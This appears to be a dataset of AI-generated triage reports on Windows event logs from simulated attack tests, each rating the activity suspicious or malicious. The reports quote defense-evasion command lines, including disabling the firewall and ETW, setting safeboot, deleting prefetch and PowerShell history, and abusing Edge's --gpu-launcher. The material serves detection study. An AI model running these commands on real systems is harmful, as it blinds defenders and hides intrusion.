   - The command line: `""cmd.exe"" /c rundll32.exe advpack.dll,LaunchINFSection ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\data.011.inf"",DefaultInstall_SingleUser,1,` is seen at `ProcessId` 4240, which indicates the use of the system's temporary directory to potentially conduct unwanted or malicious operations.

2. **Wevtutil.exe Activity:**
   - The usage of `wevtutil.exe` on a frequent basis suggests potential log manipulation, which is often observed in attempts to delete or alter logs to cover tracks of malicious activities.
   - This activity is seen running multiple times by the same user `SERVER002\admin_test` which might indicate a compromise or misuse of this administrative account.

3. **Use of `powershell.exe`:**
   - `powershell.exe` is executed by `SERVER002\admin_test`. Without further context, PowerShell's execution might seem benign; however, it’s important to ascertain the script or command that was being executed to ensure it's not indicative of unauthorized or malicious script execution.

4. **Chain of Execution Involving `hostname.exe`, `whoami.exe`, and `cmd.exe`:**
   - The execution of `hostname.exe` and `whoami.exe` along with potential command and control operations could imply reconnaissance activities on the system to ascertain system details and user information.

5. **Edge Update Activities:**
   - There’s a significant amount of activity relating to Microsoft Edge updates. However, these seem to map correctly to known components and do not inherently suggest suspicious activity without further context showing misuse.

6. **Privileges and Security Logs:**
   - From the security logs, privileged accounts (i.e., SYSTEM) are shown to receive heightened privileges (`SeDebugPrivilege` among others), which in itself is usual for SYSTEM processes but could be alarming if it follows or precedes other suspicious activities.

### Threat Assessment:

The logs exhibit activity that is **SUSPICIOUS** for the following reasons:
- The use of `rundll32.exe` to execute commands from a temporary directory points towards a possible execution of malicious code or configuration.
- Frequent use of administrative tools like `wevtutil.exe` and `powershell.exe` without clear benign purpose is concerning and requires deeper analysis.
- Use of `cmd.exe` in conjunction with potentially harmful commands adds to the suspicious nature of these logs.

### Recommended Actions:

1. **Immediate Review:** Conduct a thorough review of the system's temporary directories and verify the integrity and origin of INF files and scripts executed.
2. **Access Logs Review:** Check access logs for the `SERVER002\admin_test` user to verify if there are unauthorized logins or unusual behavior patterns.
3. **Endpoint Protections:** Ensure that the Endpoint Detection and Response (EDR) is set to monitor and alert on the execution of commands with the patterns observed in these logs.
4. **Network Traffic Review:** Evaluate outbound network traffic for connections to known command and control hosts or unusual domains.
5. **User Account Review:** Temporarily restrict or monitor activities on the account `SERVER002\admin_test` for any potential misuse until verified.
6. **Further Investigation:** Engage broader forensic analysis to uncover any concurrent threats across the network, potentially from the same threat actor.

Resolution: **SUSPICIOUS**"
Safe Mode Boot,"Based on the provided Sysmon logs, System logs, Security logs, and the context around the CEO's machine, here is the analysis:

### Analysis Summary:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe` (EventID 5)**:
   - `wevtutil.exe` is a legitimate Windows utility used to manage event logs. Although the use of this tool itself is not malicious, its frequent and repeated execution within a short timeframe, particularly by the user `SERVER002\admin_test`, can be suspicious if it was not expected behavior or part of regular log management tasks.
   - `conhost.exe` is often related to console applications, appearing frequently may suggest repeated command line activity.

2. **Execution of `cmd.exe` with a Suspicious Command (EventID 1)**:
   - The event shows `cmd.exe` running with the command-line argument: `bcdedit /set safeboot network`. This could potentially be used to configure the system to boot in Safe Mode with networking, which might be indicative of an attempt to modify boot parameters maliciously. Safe boot modifications are a red flag if they aren't part of expected administrative tasks.

3. **Execution of `bcdedit.exe`**:
   - Following the `cmd.exe` event, there is an execution of `bcdedit.exe` with the same parameter `bcdedit /set safeboot network`, confirming a change to the boot configuration.

4. **System Time Change (Security and System logs)**:
   - A time change was noted, which might be consistent with legitimate activity, such as a time synchronization service. However, changes in system time can sometimes be used to manipulate timestamps and confuse forensic analysis.

5. **Execution of `whoami.exe` and `HOSTNAME.EXE`**:
   - Commands like `whoami.exe` and `hostname.exe` are generally benign; they are often used to capture user and system information. However, if seen in conjunction with other suspicious activities, they can indicate reconnaissance phases during an attack.

### Assessment:

Given the sequence of events, the logs indicate potentially malicious behavior:

- The **modification of Safe Boot settings** through `bcdedit` is particularly concerning, especially when executed in a high-integrity context under an account (`admin_test`) that might have been misused.
- The repeated execution of `wevtutil.exe` might also suggest an attempt to tamper with or clear event logs, potentially to cover tracks.

### Resolution: **MALICIOUS**

### Guidance:

1. **Immediate Action**:
   - Isolate the system (`Server002`) to prevent further changes and network activity.
   - Conduct a forensic memory and disk capture for detailed analysis.

2. **Investigation & Remediation**:
   - Examine recent logins, remote access sessions, and administrative activities.
   - Investigate the origin and the reason for the `bcdedit` changes. If unauthorized, reset the boot configuration to its original state.
   - Audit account `admin_test` and any related accounts for unusual activity.

3. **Monitoring & Alerts**:
   - Establish monitoring and alerting for unusual executions of system utilities like `bcdedit.exe` and `cmd.exe` with specific parameters across all systems.
   - Review and enhance EDR policies to detect similar patterns in command executions and boot configuration changes.

This assessment should be complemented with wider network analysis to check for similar activities on other machines, and to ensure complete containment and eradication of any malicious actors in the environment."
InstallUtil Uninstall method call - -U variant,"Based on the provided Windows event logs, here's a detailed analysis of any suspicious or anomalous behavior that stands out:

### Suspicious Observations:
1. **PowerShell Execution with Unusual Script:**
   - The logs contain entries indicating the execution of a PowerShell script `InstallUtilTestHarness.ps1`. This script was executed from a temporary directory and involves invoking `InstallUtil.exe` with a DLL located in a temporary directory.
   - The script attempts to execute the Uninstall method using `InstallUtil.exe` with specific command-line arguments. This behavior can be an indicator of malicious activity known as ""Living off the Land Binaries"" (LOLBins), where legitimate tools like `InstallUtil.exe` are used for malicious tasks.

2. **Compilation Activities:**
   - There are logs indicating the usage of the Visual C# Command Line Compiler (`csc.exe`) to compile code. The presence of multiple temporary directories and command-line arguments for the compilation process, especially in a user directory, can be suspicious. This often occurs with scripts that load and execute custom code.
  
3. **System Process Observations:**
   - The execution of system processes like `whoami.exe` and `hostname.exe` appear standard but are sandwiched between unusual PowerShell activities. These may indicate system reconnaissance or environment checks by an attacker.

4. **Lack of Context or Legitimate Justification:**
   - The absence of any explanation or logs from a security solution or administrative tool to justify these actions raises suspicion. Typically, such activities would be associated with diagnostics or system maintenance by well-documented scripts or software tools.

### Assessment:
- **Indicators of Potential Malicious Activity:**
  - The use of `InstallUtil.exe` in conjunction with PowerShell scripts and DLLs from temporary directories aligns with known adversarial tactics.
  - The combination of environment observation commands (`whoami`, `hostname`) increases the likelihood of reconnaissance efforts post-compromise.
  
### Resolution:
Based on the suspicious activities detected, particularly the potential use of `InstallUtil.exe` for malicious purposes, the provided logs fall under the resolution category:

- **MALICIOUS**

### Recommended Action Steps:
1. **Immediate Isolation and Investigation:**
   - Isolate the affected host to prevent further potential compromise.
   - Conduct a detailed forensic analysis on the temporary directories and files associated with the identified PowerShell scripts and compiled artifacts.
   
2. **Review and Monitor:**
   - Review any recent changes or administrative activities on the machine.
   - Enhance monitoring on similarly configured hosts in the environment for similar indicators.

3. **Incident Response:**
   - Engage with your Incident Response (IR) team to manage the suspected breach.
   - Ensure all logs are preserved for potential continued analysis and evidence.

4. **Security Enhancements:**
   - Review security policies regarding script execution and usage of system binaries.
   - Implement heightened alerting and access policies to monitor unusual command-line executions, especially those involving administrative utilities and PowerShell. 

By taking these actions, you can mitigate any potential threats and secure your environment from further malicious activities."
Ursnif Malware Registry Key Creation,"Based on the provided log data, let's analyze each log type to determine whether any suspicious or malicious activity is apparent:

### System Log Analysis
The system logs primarily show kernel general events, time creation, and timezone adjustments. Notably, there's frequent referencing of the process `svchost.exe`:
- The `svchost.exe` is a legitimate program used by Windows to host various services, and its presence alone isn't anomalous. However, discrepancies in time adjustments could indicate tampering with system time, potentially to obfuscate activities or align malicious actions with specific timestamps.
- The `svchost.exe` process seems to be involved in setting the time. This activity in the context provided does not inherently indicate malicious intent, but it is critical to correlate with other logs for systemic anomalies.

### Sysmon Log Analysis
The Sysmon logs show multiple instances of `wevtutil.exe` and `conhost.exe` executing, with one benign execution of `wevtutil.exe` and multiple conhost processes:
- `wevtutil.exe` is used for managing event logs, which could be both benign or used to clear logs in a malicious act to hide tracks. Checking for the command lines used and context in the chain of execution would be essential for determination.
- Execution of `cmd.exe` with a command modifying registry keys is unusual and possibly indicative of malicious actions or configurations. The command `/c reg add HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4` suggests potential persistence mechanisms being deployed or modified.

### Security Log Analysis
The security logs show `svchost.exe` involvement again, primarily with time change operations:
- These logs corroborate the time change activities. No direct impact on security configuration or access control events has been observed here.

### Application Log Analysis
The Application log provides a single entry about the Software Protection Platform Service, which is a regular operation within a Windows environment. It doesn't directly indicate a threat in this context but might be looked into for deviations if other logs suggest a compromise.

### Indicators - Malicious Activity Assessment
- **Registry Modification with `cmd.exe`:** The command modifying registry values with what appears to be binary data without clear contextual business logic could be malicious. Specifically, any command operating under high integrity by `cmd.exe` modifying registry keys outside of common admin tasks could suggest an attempt at persistence or configuration modification.
- **Repeated Event Log Operations with `wevtutil.exe`:** While legitimate for administrators, frequent event log management operations, potentially aiming to hide other actions, exist without a clear command line context.

### Assessment and Resolution
- The majority of the logs appear to show system maintenance and legitimate administrative tasks. However, the registry modification command combined with high integrity level access and the frequency of event utility processes could be indicative of:
  - A potentially unauthorized change to the registry aiming for persistence.
  - Potential clearing or tampering of logs not directly justified by legitimate admin tasks observed.

### Final Resolution: **SUSPICIOUS**
While not conclusively malicious, the activities require further investigation into the processes (`cmd.exe` and `wevtutil.exe`), user context, and command parameters to determine legitimacy. Specifically, attention should be paid to:
- Clarifying user actions or tasks executed during these log entries.
- Reviewing security group policies and scheduled tasks for unauthorized items.
- Verifying the consistency and legitimacy of registry entries noted in the logs. 

Further verification should be conducted through cross-referencing endpoint detection logs, user activity logs, and confirming any authorized administrative tasks within this timeframe."
WinPwn - UAC Bypass ccmstp technique,"Upon reviewing the provided Windows event logs, the following observations and analysis can be made:

### Observations:

1. **PowerShell Activity:**
   - Several PowerShell logs (EventID 600) indicate the execution of a script downloaded from a GitHub repository related to the user `S3cur3Th1sSh1t`.
   - The script seemingly executes a PowerShell command, which downloads and runs a script `WinPwn.ps1`. This script engages in an implicit attempt at UAC bypass with the use of `ccmstp`, a known technique for privilege escalation. Ultimately, the execution of `calc.exe` is attempted, which is often employed in testing or as a decoy in malicious activities.

2. **Sysmon Logs:**
   - Events capture the execution of `powershell.exe` with command lines that indicate the downloading and execution of a script from the internet. This directly corresponds to the PowerShell log and suggests execution in a potentially high-integrity level state, given the UAC bypass method mentioned.

3. **Network Activity by System Processes:**
   - System processes `svchost.exe` and `time.windows.com` are involved in time synchronization activities. Although timestamp alterations could be a concern, they seem linked to time synchronization rather than unusual system time alteration.

4. **Application and EdgeUpdate Activity:**
   - Regular EdgeUpdate activities are observed, involving Microsoft Edge Update processes. These events primarily show system-level updates and service operations and do not raise direct security concerns unless additional context (like unusual intervals or non-standard command lines) offered evidence contrary.

5. **Security Logs:**
   - Time change events logged under the Security channel reflect legitimate services involved (e.g., `svchost.exe` handling time synchronization). No direct evidence of malicious intent or execution deviation was easily discerned in these logs within normal operating parameters.

### Assessment:

The combination of the PowerShell logs and Sysmon events is indicative of potentially malicious activity. The execution of a script directly downloaded from an unverified source on GitHub and an attempt to bypass User Account Control (UAC) to execute commands without elevation prompts typically aligns with behaviors seen in attack vectors.

### Resolution:

- **Resolution: MALICIOUS**

### Recommended Actions:

1. **Immediate Containment:**
   - Quarantine the machine to prevent any further potential lateral movement within the network.
   - Isolate the network segment, if feasible, to contain the risk further.

2. **Forensic Analysis:**
   - Retrieve and analyze the downloaded `WinPwn.ps1` script for further details on potential payloads or malicious capabilities.
   - Examine any changes made during this PowerShell session for indicators of compromise (IOCs) beyond this session's scope.

3. **Remediation:**
   - Conduct a full scan using an updated endpoint security solution focusing on lateral movement detected and any found artifacts related to the PowerShell script.
   - Disable internet access through scripting channels for non-administrative use on critical assets like CEO machines.

4. **Review and Audit:**
   - Review current Group Policies, particularly concerning PowerShell execution policies and UAC settings.
   - Increase monitoring sensitivity on administrative level actions, particularly PowerShell engagements.

Given the details and the context of the PowerShell activities, immediate action should be taken to mitigate any current threat and assess whether further compromise has occurred within the infrastructure."
Disable .NET Event Tracing for Windows Via Registry (powershell),"In analyzing the provided logs across Windows PowerShell, System, Sysmon, Security, and Application event logs, the following points of interest were identified:

### Suspicious Observations:

1. **PowerShell Behavior**
    - The PowerShell logs indicate the command `New-ItemProperty` was executed to modify the registry key `HKLM:\Software\Microsoft\.NETFramework` to change the `ETWEnabled` value to `0`. This action aims to disable Event Tracing for Windows (ETW), which is commonly used to trace and monitor system activity for forensic analysis. The use of `-Force` indicates the command was executed to override existing properties, which could be suspicious if performed without clear administrative intent.

2. **Time Modification**
    - The System and Security logs indicate a modification of system time. The event shows the system time was rolled back slightly from `2024-10-28 12:17:01` to `2024-10-28 12:16:55`. Frequent or unexplained system time changes can be indicative of an attempt to manipulate time to evade detection or alter log timestamps, which is a known tactic in various attack scenarios.

3. **Sysmon Entries**
    - Multiple executions of `wevtutil.exe` and `conhost.exe` are logged, but these processes as part of normal operation by themselves do not raise immediate suspicion. However, given the context, monitoring tools or tasks that involve these processes could suggest manipulation efforts or the use of legitimate tools by an attacker.

### Malicious Assessment and Recommendation:

Based on the analysis of these activities, there are strong indicators of potentially malicious activities:

- **ETW Disabling via PowerShell**: The action of disabling ETW without documented administrative purpose is a common malicious behavior used to obscure activity and bypass logging monitors.
- **System Time Manipulation**: This is typically a sign of manipulation for malicious intent, such as attempting to disrupt the forensic integrity of log timelines or to assist in time-based evasion techniques.

### Guidance and Resolution:

1. **Resolution: MALICIOUS**
   - The combination of attempting to disable security controls (ETW) and altering system time strongly suggests malicious intent, warranting immediate investigation and containment actions.

2. **Next Steps:**
    - **Immediate Isolation**: Isolate the affected machine, Server002, to prevent potential further malicious actions or spread to other network systems.
    - **Root Cause Analysis**: Conduct further forensic investigation to trace the origin and full scope of the breach.
    - **Review Administrative Access**: Audit privileged accounts to assess unauthorized access or misuse and reset credentials where necessary.
    - **Enhanced Monitoring**: Implement enhanced monitoring and logging to detect similar actions in the future.

In conclusion, the observed activities are classified as malicious, necessitating urgent containment and response measures to protect the organization's assets and ensure system integrity."
LOLBAS Msedge to Spawn Process,"### Detailed Analysis of the Logs:

Upon reviewing the Windows event logs, several suspicious behaviors and patterns emerge, which indicate potential malicious activity.

#### Suspicious or Anomalous Behavior:
1. **Powershell Execution (Sysmon & PowerShell logs)**
   - The logs reveal a PowerShell script execution (seen in both the Sysmon and PowerShell logs) with a complex command-line argument:
     ```plaintext
     powershell.exe & { $edgePath64 = ""C:\Program Files\Microsoft\Edge\Application\msedge.exe"", if (Test-Path $edgePath64) { $edgePath = $edgePath64 } else { # Check 32-bit Edge installation path $edgePath32 = ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"", if (Test-Path $edgePath32) { $edgePath = $edgePath32 } else { exit 1 } }, & $edgePath --disable-gpu-sandbox --gpu-launcher=""C:\\Windows\\System32\\calc.exe &&"", sleep 5, taskkill -f -im msedge.exe, taskkill -f -im calc.exe, taskkill -f -im win32calc.exe }
     ```
   - This script checks for the presence of Microsoft Edge in both 64-bit and 32-bit directories and uses the `--gpu-launcher` option to run `calc.exe` in conjunction with Edge. This behavior is highly unusual and suggests potential command-line obfuscation or exploitation.
   
2. **Command and Control Tactics:**
   - The use of PowerShell to launch and control Edge suggests a command and control style attack where additional commands or software may be executed through seemingly benign applications.

3. **Task Killing with `taskkill`:**
   - Multiple `taskkill` commands are observed, attempting to forcibly terminate `msedge.exe`, `calc.exe`, and `win32calc.exe`. This indicates an attempt to remove traces of activity or disrupt observation of the processes spawned.

4. **High Integrity Level Process Execution:**
   - The PowerShell script and subsequent processes run with a high integrity level by `admin_test`, indicating privilege escalation or the execution of tasks with elevated privileges.

5. **Service and Software Updates:**
   - The Sysmon log records abundant execution of the Microsoft Edge Update processes, indicating possibly benign software updating. However, given the suspicious PowerShell activity and the timing overlap, this might relate to covert attempts to download or execute malicious binaries under the guise of legitimate file names or services.

#### Indicators of Malicious Activity:
- There is a definitive attempt to obfuscate process execution using PowerShell commands, manipulate Edge's normal operation, and terminate applications forcibly, which are clear signs of compromise or malware behavior.
- The behavior observed is likely part of a Living-off-the-Land (LotL) attack, leveraging native Windows utilities to evade detection while executing potentially destructive activities.
- The manipulation of Microsoft Edge through unconventional flags (e.g., `--gpu-launcher`) to execute unrelated programs (calculator) is particularly concerning and points toward potential abuse of Edge browser functionalities or a vulnerability within it.

### Assessment of the Situation:
- The evidence supports a finding of potentially malicious activity on the CEO's machine. The use of PowerShell to execute complex and potentially destructive commands, combined with the manipulation of legitimate software processes, signifies an intrusion with intent to abuse system resources or data.

### Recommended Course of Action:
1. **Resolution: MALICIOUS**
   - Immediate mitigation steps should be taken due to the presence of unauthorized and potentially harmful activities.
   - Conduct a full forensic investigation to understand the scope of the attack.
   - Isolate the affected machine from the network to prevent lateral movement and further damage.
   - Review and enhance security measures like PowerShell logging, anti-malware solutions, and user privilege management to prevent future breaches.
  
This case requires urgent attention due to clear indicators of malicious intent and the potential risk posed to organizational data and systems integrity."
Modify UsePartialEncryptionKey Registry entry,"After analyzing the provided event logs from the Sysmon, System, Security, and Application logs, the following observations and assessments can be made:

### Analysis of Sysmon Logs

1. **Process Execution**: 
   - **`wevtutil.exe` and `conhost.exe`**: These processes were repeatedly executed by the `SERVER002\\admin_test` user.
   - **`whoami.exe` and `hostname.exe`**: Common utilities were executed from a high integrity level.
   - **`cmd.exe` Execution**: A command to modify the registry related to ""FVE"" (likely Full Volume Encryption) was executed, which is unusual without known administrative tasks.
   - **Registry Modification**: The use of `reg.exe` to modify HKLM is a privileged action that should be verified if it aligns with administrative tasks.

2. **Time Discrepancy**:
   - Multiple entries indicate time adjustments on the machine, as noted in the security logs and corroborated by system logs. Time adjustments can be associated with attempts to obscure activity.

### Analysis of System Logs

- **Time Adjustments**: Reports of time being adjusted by the `svchost.exe` process indicates that system time was altered, which is corroborated in the security logs. This could be benign if there was a legitimate time correction but should still be reviewed to ensure it's not being used to hide activity.

### Analysis of Security Logs

- **Time Change Events**:
  - Timestamp changes via `svchost.exe` provide more context to the potentially unauthorized time adjustments.

### Analysis of Application Logs

- **EdgeUpdate Activity**:
  - Normal occurrences of Microsoft Edge Update processes and service stop events. 
  - Log shows updates are typical and don't show signs of tampering, running under NT AUTHORITY\SYSTEM.

### Conclusion

Based on the events, particularly focusing on the `cmd.exe` process execution modifying registry keys related to encryption and the multiple time adjustments in the system logs, the activities raise concerns:

- **Registry Modifications** and **Unexplained Time Adjustments** indicate a potential compromise or at least suspicious behavior that necessitates further investigation.

### Final Assessment: SUSPICIOUS

The logs contain activity that doesn't look right and requires further investigation to confirm if it was authorized or malicious. It's crucial to verify if these actions align with any legitimate administrative tasks or if they are indicative of unauthorized behavior. Further investigation should include:

- Confirm with IT or the user `admin_test` if the registry changes and time modifications were planned or sanctioned.
- Check for additional logs or alerts from the EDR related to these events for more context.
- Review policies and settings to ensure no malicious or unintended configurations are in effect.

Proceed with caution by monitoring the system for similar behavior and reviewing any corresponding alerts from security solutions."
Requires the BitLocker PIN for Pre-boot authentication,"**Analysis of the Windows Event Logs**

After analyzing the provided logs, several observations can be made regarding the activity on this machine. These assessments are based on the patterns and characteristics often associated with malicious activity as well as normal user actions:

1. **Process Execution:**
   - **""whoami.exe""** is executed multiple times. This utility is typically used to display the current user's information and is not inherently suspicious. However, repeated use, especially under a high integrity level, could indicate the staging of a reconnaissance activity or privilege validation by an attacker.
   - **""wevtutil.exe""**, a utility for managing event logs, is executed multiple times by the user ""SERVER002\\admin_test"". Although this utility is legitimate, frequent execution may suggest attempts to clear logs, which can indicate malicious intent.
   - The execution of **""cmd.exe""** with command-line arguments that modify registry values (`reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f`) suggests persistent configuration changes. Registry modifications can sometimes indicate attempts to alter system behavior or security settings.

2. **Unusual Patterns:**
   - Processes initiated from **""wsmprovhost.exe""** with high privileges suggest the use of Windows Remote Management (WinRM) or similar remote administrative tools. This could be legitimate; however, it also indicates potential misuse for remote execution.
   - Multiple instances of **""conhost.exe""** appear linked as parent processes to both `whoami.exe` and other administrative tools like `HOSTNAME.EXE`. While `conhost.exe` is common when using console applications, frequent instances around sensitive operations can be suspicious unless their purpose is clearly understood.

3. **Privilege Escalation or Recon Activities:**
   - The registry command executed via **""cmd.exe""** sets a parameter often associated with system policies, particularly involving security (BitLocker in this case). It's crucial to verify whether such changes were intended by system administrators.

4. **System Logs and Time Changes:**
   - Kernel-General and Security Auditing logs indicate time synchronization events involving `svchost.exe`, which appears benign and is a regular activity on Windows systems for keeping time accurate.

5. **Edge Update Executions:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` running as ""NT AUTHORITY\\SYSTEM"" may be regular update activities, but it's worth confirming that these updates were expected during the scanning period.

**Assessment:**

While many of the logged events can occur during routine administrative operations, the combination of registry modifications, frequent use of administrative process monitoring/output (like `whoami.exe`), and event log utility frequent invocation suggest potentially suspicious behavior.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

- **Further Investigation:** Cross-reference the timing of the events with known administrative activities or scheduled tasks. Verify if there's a legitimate reason for registry modifications and multiple uses of `wevtutil.exe`.
- **Network Traffic Analysis:** Inspect network logs around the event timestamps to determine if any unauthorized remote access occurred.
- **User Education:** Ensure that system administrators understand the implications of using high-privilege commands and logging utilities, emphasizing the need for minimal privilege use.
- **Monitoring:** Increase monitoring of the `SERVER002` system for continued or repeated use of such patterns, particularly the use of registry changes and event log utilities.
- **Review Security Policies:** Confirm that security policies, including those related to remote management and script execution, align with best practices and organizational requirements.

In conclusion, while these activities aren’t explicitly malicious, they do warrant a deeper investigation to rule out compromise or unauthorized access efforts."
Disable Microsoft Defender Firewall via Registry,"After reviewing the provided Windows event logs, I have identified several points of interest for analysis:

1. **Time Anomaly (EventID 4616):** 
   - There are multiple events indicating time adjustments by `svchost.exe` processes. The NewTime values are earlier than the PreviousTime values, which suggests the system clock was set back. While time adjustments can occur due to legitimate reasons like syncing with external time servers, frequent or unexpected time changes can be indicative of an attacker attempting to hide their activities. 

2. **Privilege Assignment (EventID 4672):**
   - The log entries show that the `admin_test` user account was assigned a comprehensive range of privileges, including `SeDebugPrivilege`, which could allow access to sensitive system processes and could be exploited by malicious actors for privilege escalation.

3. **Anomalous Commands in Sysmon Logs:**
   - The execution of `cmd.exe` with a command line that disables the Windows Firewall (`reg add ... /v ""EnableFirewall"" /t REG_DWORD /d 0 /f`) is highly concerning. Disabling firewall protections is a common step in early stages of a cyber attack to allow unmonitored access to the system.

4. **Use of Administrative Tools (Sysmon Logs):**
   - Multiple uses of tools like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` under the `admin_test` account might be part of normal administrative operations, but the context suggests potentially malicious behavior. Especially, `wevtutil.exe` can be used to clear or export event logs, which could be an attempt to cover tracks.

5. **Network Logon (EventID 4624) from External Workstation:**
   - Notable network logons were recorded from an IP within a local range (`192.168.0.102`). The logon used NTLM, indicating it might be a local network. However, ensuring these access attempts are authorized is crucial. The suspicious part is not mandatorily the IP but the combination of usage with high privileges.
 
**Assessment and Resolution:**
The activities identified—backdating the system clock, altering firewall settings, the assignment of extensive privileges, and the pattern of use of certain administrative tools—compose a telltale sign of potential malicious activity. These elements strongly align with behaviors seen in lateral movement or preparation for data exfiltration and persistence mechanisms.

Based on the evidence gathered from the logs, I classify the findings as **MALICIOUS**. 

**Guidance:**
- Immediately isolate the host from the network to prevent further potential compromise.
- Conduct a thorough endpoint investigation, including memory analysis and file integrity checks.
- Change all passwords associated with admin accounts, including `admin_test`.
- Review access controls and ensure auditing is enabled for further monitoring.
- Patch any vulnerabilities the system might have, particularly around privilege escalation vectors.
- Consider consulting with a digital forensics team for an in-depth investigation and remediation strategy.

These actions can help secure the environment, mitigate the outlined risks, and prevent reoccurrence."
Delete a single file - Windows cmd,"### Analysis:

The provided log entries indicate both system operations and potential anomalous activities on the system, primarily involving command execution and file manipulation:

1. **Repeated Command Execution**:
   - **Cmd.exe** is executed multiple times with varying arguments, specifically involving the ""deleteme_data.004"" file. This repeated execution with conditional checks (`/c IF EXIST`) and actions (creating or deleting files) is often seen in scripted activities, which might be either automated tasks or malicious scripts.
   - **Command Line Activities**:
     - The commands being executed are checking for the existence of a file, creating it if it doesn’t exist, and eventually deleting it. This type of activity suggests a potential temporary operation, possibly an attempt to obfuscate or temper evidence of temporary files.
   
2. **Use of **wsmprovhost.exe**:
   - The parent process for these cmd executions is `wsmprovhost.exe`, which is a legitimate Windows process for Windows Remote Management (WinRM). However, exploitation or misuse of such processes can indicate malicious activities, especially if coupled with suspicious command executions.

3. **High Integrity Level**:
   - The processes are running with ""High"" integrity level, potentially indicating administrative privileges which, if unauthorized, signifies a higher risk of compromise.

4. **File and Command Patterns**:
   - The pattern of creating an empty file and then attempting to delete it might be an attempt to bypass certain security filters or just an innocent script execution for cleanup; however, this sort of behavior often warrants further scrutiny.

5. **Logs without Obvious Signatures**:
   - The logs do not explicitly indicate a well-known malware signature or an obvious breach, but the systematic creation and deletion of files could indicate a precursor to more malicious activities.

6. **Wevtutil.exe Usage**:
   - `wevtutil.exe` is being invoked multiple times. This utility is often used to interact with the event logs, which might be normal for log management but can be leveraged for malicious purposes such as tampering, clearing logs, or information gathering.

7. **System and Security Logs**:
   - The `svchost.exe` processes operating under NT AUTHORITY accounts are consistent with normal Windows service operations. However, any anomalous behavior in time settings or repeated sync processes should be noted for potential anomalies, though none are immediately evident here.

### Assessment:
The activities in the logs, particularly the repetitive file manipulation using command line and the involvement of processes like `cmd.exe` and `wevtutil.exe` alongside `wsmprovhost.exe` with high integrity levels, do not present clear-cut malicious intent but do appear suspicious.

### Resolution:
**SUSPICIOUS** - While no definitive malicious activity is explicitly confirmed, the behaviors exhibited in the logs—particularly the systematic creation and deletion of a temporary file with scripts and involvement of Windows Remote Management components—warrant further investigation. It is advisable to:
- Conduct a review of the scripts and scheduled tasks on the system.
- Monitor the machine for further signs of lateral movement or privilege escalation attempts.
- Ensure that no unauthorized changes to configurations or policies are executed.
  
### Guidance:
- Continue monitoring the system for unusual activities.
- Conduct a thorough audit on the command scripts being executed, especially those originating from or related to maintenance, backups, or other automated processes.
- Review permissions and logs for any administrative account activity to spot illicit privilege use."
Delete Prefetch File,"Upon analyzing the provided Windows event logs, several findings stand out that indicate potentially suspicious activities. I'll break it down as follows:

### Windows PowerShell Logs
- The PowerShell logs show a command execution where `powershell.exe` is used to remove a prefetch file, specifically: `powershell.exe & {Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])}`. This command is suspicious as it attempts to delete prefetch files, which can be an attempt to clear tracks of executed programs. The use of `PowerShell` in this manner can often be associated with malicious activities such as malware trying to cover its tracks.

### Security Logs
- **Event ID 4624**: Multiple logons for the `SYSTEM` user (NT AUTHORITY\SYSTEM) are occurring, which is normal; however, if not cross-verified with real administrator activity, this could indicate unauthorized elevated access.
- **Event ID 4672**: Special privileges are being assigned to the `SYSTEM` account. This is typical for SYSTEM processes but should be monitored for anomalous processes.
- **Event ID 5379**: Multiple failed attempts to establish credentials for `MicrosoftAccount:user=02txoixylodcstop` and others could indicate potential attempts to access or abuse user credentials through a brute-force mechanism.

### Sysmon Logs
- Execution of `whoami.exe` and `HOSTNAME.EXE` by the `admin_test` user. While the execution of `whoami.exe` is often benign, context matters. If not executed intentionally by an administrator, it could signal reconnaissance activity.
- Frequent use of `wevtutil.exe` by `admin_test` is observable. This tool is typically used to query event logs. If this execution was not planned as part of routine admin work, it could suggest log manipulation or clearance attempts.
- Execution of `powershell.exe` with command-line arguments tailored to delete prefetch files again highlights suspicious behavior aimed at removing evidence of prior executions.

### Application and System Logs
- Normal functioning reflected by the presence of Windows Defender turned on (Event ID 15) and Windows updates occurring (Event ID 19). These show that the system was under regular operation from an update perspective.

### Assessment and Guidance
- The recurring theme in these logs is system reconnaissance and potential evidence-clearing through prefetch file deletions and event log querying, which are red flags in cybersecurity.
- It is essential to determine if `admin_test` acknowledges executing these actions intentionally as part of maintenance or investigation—if not, this account could be compromised.
- Given these observations, the resolution for the logs is **SUSPICIOUS**. The behavior reflected in these logs warrants further investigation to confirm if these actions were legitimatized by authorized personnel or if they are indicative of malicious intent.

### Recommendations
1. **Investigate User Account Activities**: Verify the actions and intentions associated with the `admin_test` account to determine legitimacy.
2. **Increase Monitoring**: Enhance monitoring on PowerShell and `wevtutil.exe` usage to quickly intercept any unauthorized activities.
3. **Review Security Policies**: Fortify credential security protocols and log retention strategies to prevent unauthorized access and log tampering.
4. **Conduct Threat Hunting**: Initiate threat-hunting processes to explore possible persistence mechanisms installed by malicious actors.
5. **Immediate Containment if Compromised**: If evidence of compromise is confirmed, begin immediate incident response activities to contain and remediate the threat."
Clear Powershell History by Deleting History File,"**Detailed Analysis:**

1. **System Log:**

   - There are multiple events related to time synchronization using the Network Time Protocol (NTP). The `svchost.exe` process is responsible for updating the system time. There is nothing suspicious about time synchronization activities as they are part of normal system operations.

2. **Application Log:**

   - A single log entry by the Software Protection Platform Service (`sppsvc.exe`). This activity seems routine and is linked to software licensing, with no indication of any anomaly or suspicious operations.

3. **Security Log:**

   - Event ID 4616 logs are present that indicate time changes. These logs correlate with the NTP time synchronization entries in the system logs and do not appear suspicious.

4. **Windows PowerShell Log:**

   - There are PowerShell logs showing `powershell.exe` was executed with a command to remove the PowerShell history file via `(Get-PSReadlineOption).HistorySavePath`. This command may be suspicious as it attempts to clear PowerShell history, which could be a step to cover tracks in a malicious activity scenario.

5. **Sysmon Log:**

   - There are several entries involving `wevtutil.exe` and `conhost.exe`, as well as the use of `whoami.exe` and `hostname.exe`. The recurrent presence of `wevtutil.exe` could indicate potential removal or manipulation of system logs, which is suspicious.
